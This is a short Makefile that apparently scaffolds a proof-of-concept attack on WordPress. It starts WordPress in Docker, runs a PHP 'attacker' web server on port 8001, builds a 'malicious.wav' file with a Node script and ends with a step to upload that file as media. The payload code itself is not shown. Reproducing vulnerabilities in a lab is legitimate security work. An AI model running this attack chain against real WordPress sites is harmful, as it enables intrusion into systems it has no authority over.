# Step1. Run WordPress
.PHONY: up-wp
up-wp:
	docker-compose up

# Step2. Run Attacker web server
.PHONY: up-mal
up-mal:
	php -S 0.0.0.0:8001 -t attacker/www/

# Step3. Generate malicious WAV file
.PHONY: make-wav
make-wav:
	cd attacker/malicious_wav && \
	npm install && \
	node index.js && \
	mv malicious.wav ../..

# Step4. Login to WordPress & Upload WAV file to New Media
